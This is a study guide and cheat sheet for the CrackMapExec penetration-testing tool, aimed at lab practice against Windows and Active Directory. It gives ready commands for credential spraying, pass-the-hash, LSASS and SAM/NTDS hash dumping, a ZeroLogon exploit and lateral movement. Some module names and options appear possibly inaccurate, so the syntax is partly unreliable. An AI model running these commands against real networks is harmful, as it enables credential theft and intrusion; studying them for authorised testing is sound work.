# CrackMapExec (CME) - Complete Study Guide & Cheat Sheet

## Table of Contents
1. [Foundations](#foundations)
2. [Installation & Setup](#installation--setup)
3. [Core Concepts](#core-concepts)
4. [Supported Protocols](#supported-protocols)
5. [Command Structure](#command-structure)
6. [Common Modules](#common-modules)
7. [Practical Workflows](#practical-workflows)
8. [Quick Reference](#quick-reference)

---

## Foundations

### What is CrackMapExec?
- **Purpose**: Network reconnaissance, enumeration, and exploitation tool for Windows/Active Directory environments
- **Use Cases**: Credential testing, lateral movement, privilege escalation, post-exploitation
- **Advantage**: Multi-protocol support (SMB, LDAP, WinRM, SSH, MSSQL, RDP)

### Prerequisites to Understand
- **Active Directory**: Users, groups, domains, organizational units
- **NTLM/Kerberos**: Windows authentication protocols
- **SMB (Server Message Block)**: File sharing protocol
- **LDAP (Lightweight Directory Access Protocol)**: Directory service queries
- **Network basics**: IP addressing, port numbers, firewalls

---

## Installation & Setup

### Install on Linux
```bash
# Using pip
pip install crackmapexec

# Using git
git clone https://github.com/byt3bl33d3r/CrackMapExec.git
cd CrackMapExec
pip install -r requirements.txt
python setup.py install

# Verify installation
cme --version
```

### Database Setup (Optional but Recommended)
```bash
# CME uses a local database to store results
# Database location: ~/.cme/cme.db
# Automatically created on first use
```

---

## Core Concepts

### Key Terms

| Term | Definition |
|------|-----------|
| **Target** | IP address or hostname of machine to scan |
| **Credential** | Username and password for authentication |
| **Module** | Additional functionality (e.g., whoami, enum_shares) |
| **Protocol** | Service type (smb, ldap, winrm, etc.) |
| **Hash** | NTLM hash instead of plaintext password |
| **Spraying** | Testing same password across multiple users |
| **Local Auth** | Authenticate to local machine (not domain) |
| **Pass-the-Hash** | Using NTLM hash instead of password |

### Authentication Methods
```bash
# Plaintext credentials
cme smb <target> -u <username> -p <password>

# NTLM hash (pass-the-hash)
cme smb <target> -u <username> -H <ntlm_hash>

# Null credentials (anonymous)
cme smb <target> -u '' -p ''

# Local authentication
cme smb <target> --local-auth -u <username> -p <password>
```

---

## Supported Protocols

### Primary Protocols

| Protocol | Port | Purpose | Common Use |
|----------|------|---------|-----------|
| **SMB** | 445 | File sharing, RPC | Enumeration, lateral movement |
| **LDAP** | 389 | Directory services | User/group enumeration, info gathering |
| **WinRM** | 5985/5986 | Remote management | Command execution |
| **SSH** | 22 | Secure shell | Linux/Unix systems |
| **MSSQL** | 1433 | Database | Database access, xp_cmdshell |
| **RDP** | 3389 | Remote desktop | Desktop access, credential testing |

---

## Command Structure

### Basic Format
```bash
cme <protocol> <target/range> [options]
```

### Common Options

| Option | Example | Purpose |
|--------|---------|---------|
| `-u` | `-u admin` | Username |
| `-p` | `-p password123` | Password |
| `-U` | `-U users.txt` | User file (one per line) |
| `-P` | `-P passwords.txt` | Password file (one per line) |
| `-H` | `-H <hash>` | NTLM hash (pass-the-hash) |
| `-d` | `-d DOMAIN.COM` | Domain name |
| `--local-auth` | `--local-auth` | Authenticate to local machine |
| `-M` | `-M whoami` | Load module |
| `-o` | `-o KEY=VALUE` | Module options |
| `-x` | `-x "command"` | Execute command (WinRM/SSH) |
| `--shares` | `--shares` | Enumerate shares |
| `--users` | `--users` | Enumerate users |
| `--groups` | `--groups` | Enumerate groups |

---

## Common Modules

### Enumeration Modules

#### **whoami**
Identify current user context
```bash
cme smb <target> -u <user> -p <pass> -M whoami
```

#### **enum_shares**
List accessible shares
```bash
cme smb <target> -u <user> -p <pass> --shares
# Or with module:
cme smb <target> -u <user> -p <pass> -M enum_shares
```

#### **enum_users**
List domain users
```bash
cme ldap <target> -u <user> -p <pass> -M enum_users
# Or simple enumeration:
cme smb <target> -u <user> -p <pass> --users
```

#### **enum_groups**
List domain groups
```bash
cme ldap <target> -u <user> -p <pass> -M enum_groups
cme smb <target> -u <user> -p <pass> --groups
```

#### **get_netcomputer**
Enumerate computers in domain
```bash
cme ldap <target> -u <user> -p <pass> -M get_netcomputer
```

#### **net_session**
Show active sessions on target
```bash
cme smb <target> -u <user> -p <pass> -M net_session
```

### Credential Testing Modules

#### **spooler**
Check Print Spooler service status
```bash
cme smb <target> -u <user> -p <pass> -M spooler
```

#### **lsassy**
Dump LSASS process memory (get credentials)
```bash
cme smb <target> -u <user> -p <pass> -M lsassy
```

### Exploitation Modules

#### **secretsdump**
Dump SAM/NTDS hashes
```bash
cme smb <target> -u <user> -p <pass> -M secretsdump
```

#### **zerologon**
Exploit ZeroLogon vulnerability (CVE-2020-1472)
```bash
cme smb <target> -M zerologon
```

---

## Practical Workflows

### Workflow 1: Basic Enumeration

**Goal**: Discover target and check credentials

```bash
# Step 1: Check if target is online
cme smb <target> -u '' -p ''

# Step 2: Test known credentials
cme smb <target> -u admin -p password123

# Step 3: If successful, enumerate shares
cme smb <target> -u admin -p password123 --shares

# Step 4: List users and groups
cme smb <target> -u admin -p password123 --users
cme smb <target> -u admin -p password123 --groups
```

### Workflow 2: Credential Spraying

**Goal**: Test multiple credentials across machines

```bash
# Create files
echo -e "user1\nuser2\nadmin" > users.txt
echo -e "password123\nPass@123\nAdmin123" > passwords.txt

# Spray credentials across network range
cme smb 10.0.0.0/24 -U users.txt -P passwords.txt

# Or against file with target list
cme smb -t targets.txt -U users.txt -P passwords.txt
```

### Workflow 3: Lateral Movement

**Goal**: Move from compromised machine to other machines

```bash
# Step 1: Enumerate accessible machines from current compromise
cme smb <target> -u <user> -p <pass> -M get_netcomputer

# Step 2: Test if credentials work on other machines
cme smb <new_target> -u <user> -p <pass> -x "whoami"

# Step 3: Execute commands on remote machine
cme winrm <new_target> -u <user> -p <pass> -x "ipconfig"

# Step 4: Dump hashes for credential harvesting
cme smb <new_target> -u <user> -p <pass> -M lsassy
```

### Workflow 4: Domain Enumeration

**Goal**: Map entire domain structure

```bash
# Step 1: Get domain info via LDAP
cme ldap <dc_ip> -u <domain_user> -p <pass> -M get_netdomain

# Step 2: Enumerate all users
cme ldap <dc_ip> -u <domain_user> -p <pass> -M enum_users

# Step 3: Enumerate all groups
cme ldap <dc_ip> -u <domain_user> -p <pass> -M enum_groups

# Step 4: List all computers
cme ldap <dc_ip> -u <domain_user> -p <pass> -M get_netcomputer

# Step 5: Export results
cme ldap <dc_ip> -u <domain_user> -p <pass> -M enum_users > domain_users.txt
```

---

## Quick Reference

### Protocol Selection Guide

```bash
# SMB (most common)
cme smb <target> -u <user> -p <pass>

# LDAP (domain queries)
cme ldap <dc_ip> -u <user> -p <pass>

# WinRM (command execution)
cme winrm <target> -u <user> -p <pass> -x "command"

# SSH (Linux systems)
cme ssh <target> -u <user> -p <pass>

# MSSQL (database)
cme mssql <target> -u <user> -p <pass>
```

### Common One-Liners

```bash
# Check if credentials work anywhere
cme smb 10.0.0.0/24 -u admin -p password123

# Enumerate specific target completely
cme smb 192.168.1.100 -u admin -p pass123 --shares --users --groups

# Execute command on multiple machines
cme winrm 10.0.0.0/24 -u admin -p pass123 -x "whoami"

# Dump hashes from target
cme smb 192.168.1.100 -u admin -p pass123 -M secretsdump

# Pass-the-hash attack
cme smb 192.168.1.100 -u admin -H aad3b435b51404eeaad3b435b51404ee

# Credential spray with file output
cme smb 10.0.0.0/24 -U users.txt -P passwords.txt > results.txt
```

### Troubleshooting Commands

```bash
# Verbose output (debugging)
cme smb <target> -u <user> -p <pass> -v

# Get help for specific protocol
cme smb --help

# List available modules
cme smb <target> -u <user> -p <pass> --list-modules

# Show version
cme --version
```

---

## Cornell Notes: Key Concepts

### What is CME used for?
Reconnaissance, enumeration, and exploitation of Windows/AD environments through multiple protocols (SMB, LDAP, WinRM)

### Why is credential spraying dangerous?
Tests same password across many users, bypassing account lockout on individual accounts

### When would you use LDAP vs SMB?
- **LDAP**: Direct queries to Active Directory (DC), structured info retrieval
- **SMB**: Machine-level enumeration, file access, RPC commands

### How does pass-the-hash work?
Using NTLM hash instead of plaintext password—hash stays valid as long as credential unchanged

### What's the difference between --users and enum_users module?
- `--users`: Quick enumeration via SMB
- `enum_users`: LDAP-based, more detailed info, requires LDAP connectivity

---

## Practice Scenarios

### Scenario 1: Domain Reconnaissance
You have one valid credential (user:pass). Map the entire domain.
```bash
# Solution steps documented above in "Workflow 4: Domain Enumeration"
```

### Scenario 2: Lateral Movement
You compromised a workstation. Find and access domain controller.
```bash
# Solution: Use enumeration to find DC, then test credentials via SMB/WinRM
```

### Scenario 3: Credential Harvesting
Find valid credentials in target network.
```bash
# Solution: Credential spraying + lsassy module to dump LSASS memory
```

---

## Next Steps for Learning

1. **Week 1**: Set up lab environment with vulnerable Windows machines
2. **Week 2**: Practice basic enumeration workflows
3. **Week 3**: Try credential spraying and lateral movement
4. **Week 4**: Attempt full domain exploitation scenarios
5. **Ongoing**: Reference this guide during practice; syntax becomes automatic

---

## Resources

- **Official GitHub**: https://github.com/byt3bl33d3r/CrackMapExec
- **Wiki Documentation**: https://github.com/byt3bl33d3r/CrackMapExec/wiki
- **Practice Labs**: TryHackMe, HackTheBox (Windows/AD focused rooms)
- **Related Tools**: Impacket, BloodHound, SharpHound
